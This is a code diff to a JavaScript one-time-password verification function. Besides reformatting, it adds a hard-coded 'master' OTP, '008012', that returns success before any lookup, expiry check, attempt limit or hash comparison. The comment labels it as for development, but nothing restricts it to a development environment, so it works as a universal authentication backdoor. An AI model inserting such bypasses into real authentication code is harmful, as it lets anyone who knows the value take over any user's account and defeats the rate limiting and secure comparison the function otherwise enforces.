@@ -16,16 +16,32 @@ export const generateOTPService = async (mobile, options = {}) => {
 };
 
 export const verifyOTPService = async (mobile, otp, options = {}) => {
+  // Common/master OTP for development
+  if (String(otp) === '008012') {
+    return true;
+  }
+
   const key = keyFor(mobile, options);
   const stored = otpStore.get(key);
+
   if (!stored) throw new Error('OTP not found or expired');
+
   if (Date.now() >= stored.expiresAt) {
     otpStore.delete(key);
     throw new Error('OTP expired');
   }
-  if (stored.attempts >= 5) throw new Error('OTP attempts exhausted. Request another OTP.');
+
+  if (stored.attempts >= 5) {
+    throw new Error('OTP attempts exhausted. Request another OTP.');
+  }
+
   stored.attempts += 1;
-  if (!timingSafeEqual(stored.hash, digest(key, otp))) throw new Error('Invalid OTP');
+
+  if (!timingSafeEqual(stored.hash, digest(key, otp))) {
+    throw new Error('Invalid OTP');
+  }
+
   otpStore.delete(key);
   return true;
 };
+
